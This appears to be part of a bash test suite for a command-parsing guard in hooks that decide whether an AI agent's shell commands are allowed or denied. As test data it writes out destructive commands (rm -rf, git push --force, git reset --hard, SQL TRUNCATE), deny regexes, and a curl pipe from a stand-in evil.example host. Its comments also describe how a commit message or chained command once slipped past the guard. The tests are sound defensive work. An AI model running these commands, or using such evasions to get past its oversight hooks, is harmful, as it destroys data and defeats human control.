assert_eq "split_command_segments: cd-prefix chain -> two segments" "$expected" "$result"

unbalanced_dq_rc=0
split_command_segments 'echo "unterminated' >/dev/null 2>&1 || unbalanced_dq_rc=$?
assert_eq "split_command_segments: unbalanced double quote -> return 1 (fail-closed)" "1" "$unbalanced_dq_rc"

unbalanced_sq_rc=0
split_command_segments "echo 'unterminated" >/dev/null 2>&1 || unbalanced_sq_rc=$?
assert_eq "split_command_segments: unbalanced single quote -> return 1 (fail-closed)" "1" "$unbalanced_sq_rc"

result=$(split_command_segments "a || b")
expected=$'a \n b'
assert_eq "split_command_segments: || splits into two segments" "$expected" "$result"

result=$(split_command_segments "a & b")
expected=$'a \n b'
assert_eq "split_command_segments: single & splits into two segments" "$expected" "$result"

# ── breadcrumb mtime probe — GNU-first with BSD fallback, OS-portable ────────
# Regression for: on Linux/GNU coreutils, `stat -f` means --file-system (exits
# 0, prints filesystem info) — NOT "format" as on BSD/macOS. A BSD-first probe
# silently returns non-numeric garbage on Linux instead of falling back. The
# probe must try GNU `-c` first (errors cleanly on BSD, triggering fallback).
mtime_probe_file="$(mktemp)"
trap 'rm -f "$mtime_probe_file"' EXIT
mtime_probe_result=$(stat -c '%Y' "$mtime_probe_file" 2>/dev/null || stat -f '%m' "$mtime_probe_file" 2>/dev/null || echo 0)
mtime_probe_numeric="no"
case "$mtime_probe_result" in
'' | *[!0-9]*) mtime_probe_numeric="no" ;;
*) mtime_probe_numeric="yes" ;;
esac
assert_eq "breadcrumb mtime probe (GNU-first) yields purely numeric value on this OS" "yes" "$mtime_probe_numeric"
rm -f "$mtime_probe_file"

# ── strip_git_global_opts — normalizes interposed git global options ────────
# Verb-preservation contract: consumes ONLY known option-shaped tokens
# between `git` and the subcommand; the first non-option token (the verb)
# is never consumed.
assert_eq "strip_git_global_opts: -C <path> commit" "git commit -m y" \
    "$(strip_git_global_opts "git -C /tmp/x commit -m y")"
assert_eq "strip_git_global_opts: --git-dir=<x> add" "git add foo" \
    "$(strip_git_global_opts "git --git-dir=/x add foo")"
assert_eq "strip_git_global_opts: --git-dir <x> (separate token) add" "git add foo" \
    "$(strip_git_global_opts "git --git-dir /x add foo")"
assert_eq "strip_git_global_opts: -c k=v commit" "git commit -m y" \
    "$(strip_git_global_opts "git -c user.name=x commit -m y")"
assert_eq "strip_git_global_opts: --work-tree=<x> status" "git status" \
    "$(strip_git_global_opts "git --work-tree=/x status")"
assert_eq "strip_git_global_opts: --no-pager log" "git log" \
    "$(strip_git_global_opts "git --no-pager log")"
assert_eq "strip_git_global_opts: multiple stacked opts" "git commit -m y" \
    "$(strip_git_global_opts "git -C /x -c user.name=y --no-pager commit -m y")"
assert_eq "strip_git_global_opts: plain git commit unchanged" "git commit -m y" \
    "$(strip_git_global_opts "git commit -m y")"
assert_eq "strip_git_global_opts: non-git input unchanged" "echo hi && ls" \
    "$(strip_git_global_opts "echo hi && ls")"
assert_eq "strip_git_global_opts: chained command normalizes the git segment" \
    "foo && git commit -m y && bar" \
    "$(strip_git_global_opts "foo && git -C x commit -m y && bar")"
assert_eq "strip_git_global_opts: -C without matching verb still preserves next token as verb" \
    "git status" \
    "$(strip_git_global_opts "git -C /tmp/x status")"

# Command strings are data: literal globs must not expand against the helper's
# caller cwd. This also preserves the caller's pre-existing noglob state.
glob_safe_dir="$(mktemp -d)"
mkdir -p "$glob_safe_dir/codegen/logging"
: >"$glob_safe_dir/codegen/logging/one.jsonl"
: >"$glob_safe_dir/codegen/logging/two.jsonl"
glob_safe_result="$(cd "$glob_safe_dir" && strip_git_global_opts "ls -t codegen/logging/*.jsonl | git -C /tmp/x status")"
assert_eq "strip_git_global_opts: literal glob remains one unexpanded token" \
    "ls -t codegen/logging/*.jsonl | git status" "$glob_safe_result"
set -f
strip_git_global_opts "git status" >/dev/null
case $- in *f*) glob_safe_noglob="yes" ;; *) glob_safe_noglob="no" ;; esac
set +f
assert_eq "strip_git_global_opts: preserves caller noglob state" "yes" "$glob_safe_noglob"
rm -rf "$glob_safe_dir"

# ── command_word_of_segment — resolves the real command word ───────────────
assert_eq "command_word_of_segment: plain command" "rm" \
    "$(command_word_of_segment "rm -rf /tmp/x")"
assert_eq "command_word_of_segment: env assignment prefix stripped" "rm" \
    "$(command_word_of_segment "FOO=1 rm -rf /tmp/x")"
assert_eq "command_word_of_segment: multiple wrapper prefixes stripped" "rm" \
    "$(command_word_of_segment "sudo env FOO=1 exec rm -rf /tmp/x")"
assert_eq "command_word_of_segment: blank segment resolves to empty" "" \
    "$(command_word_of_segment "   ")"

# ── command_invokes — command-POSITION-aware match (the pitch's core fix) ──
# Real invocations (want DENY == match, rc 0)
if command_invokes "kill 123" '^(kill|pkill|killall)$'; then r=0; else r=1; fi
assert_eq "command_invokes: kill 123 -> real invocation matches" "0" "$r"

if command_invokes "rm -rf /tmp/x" '^rm$' '(^|[[:space:]])-[a-zA-Z]*[rR][a-zA-Z]*([[:space:]]|$)|--recursive\b'; then r=0; else r=1; fi
assert_eq "command_invokes: rm -rf -> real invocation matches" "0" "$r"

if command_invokes "$(strip_git_global_opts "git push origin main")" '^git$' '^push\b'; then r=0; else r=1; fi
assert_eq "command_invokes: git push -> real invocation matches" "0" "$r"

if command_invokes "bash -c 'kill 123'" '^(kill|pkill|killall)$'; then r=0; else r=1; fi
assert_eq "command_invokes: bash -c 'kill 123' -> recurses into payload, matches" "0" "$r"

if command_invokes "sudo env FOO=1 exec rm -rf /tmp/x" '^rm$' '(^|[[:space:]])-[a-zA-Z]*[rR][a-zA-Z]*([[:space:]]|$)'; then r=0; else r=1; fi
assert_eq "command_invokes: wrapped rm -rf -> still matches after prefix strip" "0" "$r"

if command_invokes "$(strip_git_global_opts "git -C /tmp/x push")" '^git$' '^push\b'; then r=0; else r=1; fi
assert_eq "command_invokes: git -C <path> push -> normalized, matches" "0" "$r"

# Mentions (want ALLOW == no match, rc 1) — the false-positive class this
# pitch exists to fix.
if command_invokes "grep -c kill foo.sh" '^(kill|pkill|killall)$'; then r=0; else r=1; fi
assert_eq "command_invokes: grep -c kill foo.sh -> mention, no match" "1" "$r"

if command_invokes "echo 'tree-kill teardown'" '^(kill|pkill|killall)$'; then r=0; else r=1; fi
assert_eq "command_invokes: echo 'tree-kill teardown' -> mention, no match" "1" "$r"

if command_invokes "grep -rn 'rm -rf x' notes.md" '^rm$' '(^|[[:space:]])-[a-zA-Z]*[rR][a-zA-Z]*([[:space:]]|$)'; then r=0; else r=1; fi
assert_eq "command_invokes: grep -rn 'rm -rf x' notes.md -> mention, no match" "1" "$r"

if command_invokes "grep -n 'git push' docs.md" '^git$' '^push\b'; then r=0; else r=1; fi
assert_eq "command_invokes: grep -n 'git push' docs.md -> mention, no match" "1" "$r"

if command_invokes "rm --force /tmp/foo" '^rm$' '(^|[[:space:]])-[a-zA-Z]*[rR][a-zA-Z]*([[:space:]]|$)|--recursive\b'; then r=0; else r=1; fi
assert_eq "command_invokes: rm --force -> no recursive flag, no match" "1" "$r"

# Fail-closed on unbalanced quote
if command_invokes "echo 'unterminated" '^(kill)$'; then r=0; else r=1; fi
assert_eq "command_invokes: unbalanced quote -> fail closed (matches)" "0" "$r"

# ci flag — case-insensitive argv match (SQL keyword check)
if command_invokes "psql \$DATABASE_URL -c 'truncate table users;'" '^psql$' '\b(TRUNCATE|DROP[[:space:]]+TABLE|DELETE[[:space:]]+FROM)\b' ci; then r=0; else r=1; fi
assert_eq "command_invokes: lowercase truncate matches with ci flag" "0" "$r"

# ── expand_command_indirection — resolves an argv-referenced script body ───
EXPAND_TMPDIR="$(mktemp -d)"
trap 'rm -rf "$EXPAND_TMPDIR"' EXIT

printf 'git reset --hard HEAD~1\n' >"$EXPAND_TMPDIR/danger.sh"
result=$(expand_command_indirection "bash $EXPAND_TMPDIR/danger.sh")
expected="bash $EXPAND_TMPDIR/danger.sh
git reset --hard HEAD~1"
assert_eq "expand_command_indirection: bash <file> appends readable file body" "$expected" "$result"

# Additive: original command text is always the prefix of the output.
case "$result" in
"bash $EXPAND_TMPDIR/danger.sh"*) r=0 ;;
*) r=1 ;;
esac
assert_eq "expand_command_indirection: output starts with original command (additive)" "0" "$r"

# Unresolvable candidate ($var) -> command returned unchanged.
result=$(expand_command_indirection 'bash "$dynamic"')
assert_eq "expand_command_indirection: unresolved \$var path -> unchanged" 'bash "$dynamic"' "$result"

# Missing file -> unchanged.
result=$(expand_command_indirection "bash $EXPAND_TMPDIR/does-not-exist.sh")
assert_eq "expand_command_indirection: missing file -> unchanged" "bash $EXPAND_TMPDIR/does-not-exist.sh" "$result"

# Non-interpreter command word -> unchanged (no read attempted).
result=$(expand_command_indirection "ls $EXPAND_TMPDIR/danger.sh")
assert_eq "expand_command_indirection: non-interpreter word -> unchanged" "ls $EXPAND_TMPDIR/danger.sh" "$result"

# source / . forms also resolve (not just bash/sh/zsh).
result=$(expand_command_indirection "source $EXPAND_TMPDIR/danger.sh")
expected="source $EXPAND_TMPDIR/danger.sh
git reset --hard HEAD~1"
assert_eq "expand_command_indirection: source <file> appends readable file body" "$expected" "$result"

result=$(expand_command_indirection ". $EXPAND_TMPDIR/danger.sh")
expected=". $EXPAND_TMPDIR/danger.sh
git reset --hard HEAD~1"
assert_eq "expand_command_indirection: . <file> (dot-source) appends readable file body" "$expected" "$result"

# A word merely STARTING with '.' (e.g. '..', '.foo') must NOT be treated as
# the dot-source builtin — exact-match only.
result=$(expand_command_indirection ".. $EXPAND_TMPDIR/danger.sh")
assert_eq "expand_command_indirection: '..' is not dot-source -> unchanged" ".. $EXPAND_TMPDIR/danger.sh" "$result"

# Depth cap: a resolved body that itself invokes bash on another file is
# NOT chased a second level deep — only the first file's literal body text
# (containing the nested bash invocation as plain text) is appended.
printf 'bash %s/inner.sh\n' "$EXPAND_TMPDIR" >"$EXPAND_TMPDIR/outer.sh"
printf 'git push --force origin main\n' >"$EXPAND_TMPDIR/inner.sh"
result=$(expand_command_indirection "bash $EXPAND_TMPDIR/outer.sh")
case "$result" in
*"git push --force"*) r=0 ;;
*) r=1 ;;
esac
assert_eq "expand_command_indirection: depth-1 cap -> inner.sh body NOT chased" "1" "$r"

# ── escaped-quote false positives (this pitch's core fix) ──────────────────
# A backslash-escaped double-quote inside a dq string must NOT be treated as
# closing the string — the walk must consume it as a literal pair. Before the
# fix, any of these mis-parsed as unbalanced -> fail-closed -> phantom deny.

# split_command_segments must still parse (not fail) on escaped quotes.
split_command_segments 'grep "a\"b" file; echo done' >/dev/null 2>&1
assert_eq "split_command_segments: escaped dq inside dq string -> parses (rc 0)" "0" "$?"

result=$(split_command_segments 'grep "a\"b" file')
assert_eq "split_command_segments: escaped dq stays inside one segment" 'grep "a\"b" file' "$result"

# FP1 (live, 2026-07-17): grep -o pipeline with an escaped-quote pattern.
if command_invokes 'grep -o "{% include \"[^\"]*\"" tmpl | sed -n 1p' '^rm$'; then r=0; else r=1; fi
assert_eq "command_invokes FP1: grep -o pipeline w/ escaped quotes -> no rm invocation" "1" "$r"

# FP2 (live, 2026-07-17): bash -c diagnostic containing an escaped-quote
# string, no git token anywhere.
if command_invokes 'grep -c "a\"b" file.txt | bash -c "cat"' '^git$' '^push\b'; then r=0; else r=1; fi
assert_eq "command_invokes FP2: pipeline w/ escaped quotes -> no git push" "1" "$r"

# Minimal repro from the pitch: grep "a\"b" file; echo done -> no rm invocation.
if command_invokes 'grep "a\"b" file; echo done' '^rm$'; then r=0; else r=1; fi
assert_eq "command_invokes MINIMAL: grep \"a\\\"b\" file; echo done -> no rm invocation" "1" "$r"

# FP4 (live from the /ready gate on this pitch): grep -n "deny \"" <path>
if command_invokes 'grep -n "deny \"" harnesses/claude/hooks/developer-no-self-gate-reset.sh' '^rm$'; then r=0; else r=1; fi
assert_eq 'command_invokes FP4: grep -n "deny \"" <path> -> no rm invocation' "1" "$r"

# FP5 (live from the /ready gate on this pitch): git grep with an escaped-quote pattern.
if command_invokes 'git grep -n "ev\":\"committed\"" -- test_harness/lib codegen-log' '^rm$'; then r=0; else r=1; fi
assert_eq 'command_invokes FP5: git grep -n "ev\":\"committed\"" -- <paths> -> no rm invocation' "1" "$r"

# Deny-side controls: genuine destructive commands must still deny, even with
# escaped quotes present in an unrelated argument.
if command_invokes 'rm -rf /tmp/x' '^rm$' '(^|[[:space:]])-[a-zA-Z]*[rR][a-zA-Z]*([[:space:]]|$)|--recursive\b'; then r=0; else r=1; fi
assert_eq "command_invokes CONTROL: rm -rf /tmp/x -> still denies" "0" "$r"

if command_invokes 'sudo env FOO=1 rm -rf x' '^rm$' '(^|[[:space:]])-[a-zA-Z]*[rR][a-zA-Z]*([[:space:]]|$)|--recursive\b'; then r=0; else r=1; fi
assert_eq "command_invokes CONTROL: sudo env FOO=1 rm -rf x -> still denies" "0" "$r"

if command_invokes "bash -c 'rm -rf /x'" '^rm$' '(^|[[:space:]])-[a-zA-Z]*[rR][a-zA-Z]*([[:space:]]|$)|--recursive\b'; then r=0; else r=1; fi
assert_eq "command_invokes CONTROL: bash -c 'rm -rf /x' -> still denies" "0" "$r"

if command_invokes 'rm -rf "/x\"y"' '^rm$' '(^|[[:space:]])-[a-zA-Z]*[rR][a-zA-Z]*([[:space:]]|$)|--recursive\b'; then r=0; else r=1; fi
assert_eq 'command_invokes CONTROL: rm -rf "/x\"y" (escaped quote in arg) -> still denies' "0" "$r"

# Genuinely unbalanced quote (not escaped) must still fail-closed -> deny.
if command_invokes 'echo "oops' '^(kill)$'; then r=0; else r=1; fi
assert_eq "command_invokes CONTROL: genuinely unbalanced quote -> fail closed (matches)" "0" "$r"

# ── command_word_of_segment / segment_argv_of — cwd-independence (defect 2) ─
# Unquoted `local -a words=($seg)` performs glob expansion against cwd; the
# fix scopes `set -f` around the split so tokenization never depends on the
# files present in the calling directory.
cwd_glob_dir="$(mktemp -d)"
trap 'rm -rf "$cwd_glob_dir"' EXIT
: >"$cwd_glob_dir/a.txt"
: >"$cwd_glob_dir/b.txt"
(
    cd "$cwd_glob_dir" || exit 1
    result_word=$(command_word_of_segment "grep foo *.txt")
    result_argv=$(segment_argv_of "grep foo *.txt")
    echo "$result_word|$result_argv"
) >"$cwd_glob_dir/out.txt"
cwd_glob_result="$(cat "$cwd_glob_dir/out.txt")"
assert_eq "command_word_of_segment/segment_argv_of: literal *.txt, not glob-expanded" \
    "grep|foo *.txt" "$cwd_glob_result"
rm -rf "$cwd_glob_dir"

# ── strip_heredoc_bodies — heredoc BODY is DATA, never further commands ────
# All four heredoc syntaxes: <<DELIM, <<'DELIM', <<"DELIM", <<-DELIM
# (tab-suppressed). Only the body+terminator lines are dropped; opener kept.

result=$(strip_heredoc_bodies "$(printf 'codegen-log section developer --slug foo <<EOF\nbody with git commit\nEOF')")
assert_eq "strip_heredoc_bodies: bare EOF -> opener kept, body+terminator dropped" \
    "codegen-log section developer --slug foo <<EOF" "$result"

result=$(strip_heredoc_bodies "$(printf "codegen-log section developer --slug foo <<'EOF'\nbody with git commit\nEOF")")
assert_eq "strip_heredoc_bodies: quoted 'EOF' -> opener kept, body+terminator dropped" \
    "codegen-log section developer --slug foo <<'EOF'" "$result"

result=$(strip_heredoc_bodies "$(printf 'codegen-log section developer --slug foo <<"EOF"\nbody with git commit\nEOF')")
assert_eq 'strip_heredoc_bodies: double-quoted "EOF" -> opener kept, body+terminator dropped' \
    'codegen-log section developer --slug foo <<"EOF"' "$result"

result=$(strip_heredoc_bodies "$(printf 'codegen-log section developer --slug foo <<-EOF\n\tbody with git commit\nEOF')")
assert_eq "strip_heredoc_bodies: tab-suppressed <<-EOF -> opener kept, body+terminator dropped" \
    "codegen-log section developer --slug foo <<-EOF" "$result"

# No heredoc present -> passthrough unchanged.
assert_eq "strip_heredoc_bodies: no heredoc -> unchanged" \
    "git commit -m foo" "$(strip_heredoc_bodies "git commit -m foo")"

# ── is_codegen_log_write — INVOCATION-anchored, not spelling-anchored ──────
# The pitch's core fix: a command must actually INVOKE codegen-log, never
# merely SPELL the token somewhere inside it.

COMMAND='printf %s "$body" | codegen-log section developer --slug foo'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: piped body -> true (real invocation)" "0" "$r"

COMMAND='codegen-log section developer --slug foo'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: leading token -> true" "0" "$r"

COMMAND='./codegen-log section developer --slug foo'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: path-prefixed -> true" "0" "$r"

COMMAND=$(printf 'codegen-log section developer --slug foo <<EOF\nbody mentioning git commit\nEOF')
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: heredoc-fed body -> true" "0" "$r"

# The missing 2x2 cell: a real git commit whose MESSAGE happens to spell
# codegen-log must NOT be exempt (this is the live bypass the pitch fixes).
COMMAND='git add -A && git commit -m "mentions codegen-log here"'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: spelling-only in commit message -> false (DENY)" "1" "$r"

COMMAND='git commit -m foo'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: bare git commit, no token -> false" "1" "$r"

# Chained attack: a real codegen-log call followed by a real commit. Every
# segment must resolve to codegen-log (or a safe producer) — this one has a
# git segment, so it must NOT be exempt.
COMMAND='codegen-log append developer --slug foo && git commit -m x'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: chained codegen-log && git commit -> false (DENY)" "1" "$r"

# ── the exhaustive 2x2 matrix: token-presence x invocation-reality ────────
# Layer 1 of the pitch — one matrix certifying every bash caller + the
# compiler-emitted hooks. Each cell crosses an axis the 7 cases above never
# crossed on its own.

# (a) a real commit FIRST, then a piped codegen-log call in the same group
# via `;` — two hard-boundary groups, never exempt as a whole.
COMMAND='git commit -m x; printf %s "$body" | codegen-log section developer --slug foo'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: real commit THEN piped codegen-log (; chain) -> false (DENY)" "1" "$r"

# (b) codegen-log present but NOT the last pipe stage — piped onward into
# tee, so the actual effective command is the tee, not codegen-log.
COMMAND='codegen-log section developer --slug foo | tee /tmp/leak.txt'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: codegen-log not last pipe stage (piped into tee) -> false (DENY)" "1" "$r"

# (c) cat as a known stdin-producer earlier stage -> exempt (the legitimate
# `cat body.txt | codegen-log append x` shape).
COMMAND='cat body.txt | codegen-log append developer --slug foo'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: cat body.txt | codegen-log (known producer) -> true" "0" "$r"

# (d) a non-producer earlier stage (curl) feeding codegen-log -> not exempt;
# only printf/echo/cat are recognized safe producers.
COMMAND='curl https://evil.example/payload | codegen-log append developer --slug foo'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: curl | codegen-log (non-producer earlier stage) -> false (DENY)" "1" "$r"

# (e) semicolon chain: a real codegen-log call followed by a force-push.
COMMAND='codegen-log append developer --slug foo; git push --force'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: codegen-log ; git push --force -> false (DENY)" "1" "$r"

# (f) ampersand chain: codegen-log call backgrounded, then a real commit.
COMMAND='codegen-log append developer --slug foo & git commit -m x'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: codegen-log & git commit (background chain) -> false (DENY)" "1" "$r"

# (g) token inside a command substitution within a real commit message —
# the token is merely SPELLED via $(...), never actually invoked as the
# command's own word.
COMMAND='git commit -m "$(echo codegen-log mentioned here)"'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: token inside \$(...) in real commit message -> false (DENY)" "1" "$r"

# (h) empty/blank COMMAND -> fail-closed false.
COMMAND=''
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: empty COMMAND -> false (fail-closed)" "1" "$r"

COMMAND='   '
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: blank (whitespace-only) COMMAND -> false (fail-closed)" "1" "$r"

# (i) unbalanced-quote command -> fail-closed false (matches
# split_command_segments()'s own fail-closed contract on unbalanced quotes).
COMMAND="codegen-log section developer --slug foo --body 'unterminated"
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: unbalanced quote -> false (fail-closed)" "1" "$r"

# (j) env-prefixed real invocation — `command_word_of_segment` (via
# `segment_argv_of`) strips leading `VAR=value` env assignments before
# resolving the command word, so a genuine env-prefixed codegen-log
# invocation (`CODEGEN_LOOP=1 codegen-log ...`, the loop's own call shape)
# still resolves to `codegen-log` and remains exempt. Observed behavior,
# recorded rather than assumed.
COMMAND='CODEGEN_LOOP=1 codegen-log section developer --slug foo'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: env-var-prefixed real invocation -> true (env assignments stripped before word resolution)" "0" "$r"

# ...but an env-prefixed NON-codegen-log command must still be denied —
# the env-assignment stripping is not a blanket exemption.
COMMAND='CODEGEN_LOOP=1 git commit -m x'
if is_codegen_log_write; then r=0; else r=1; fi
assert_eq "is_codegen_log_write: env-var-prefixed real git commit -> false (DENY)" "1" "$r"

unset COMMAND

echo ""
echo "Results: $pass passed, $fail failed"

[ "$fail" -gt 0 ] && exit 1
exit 0
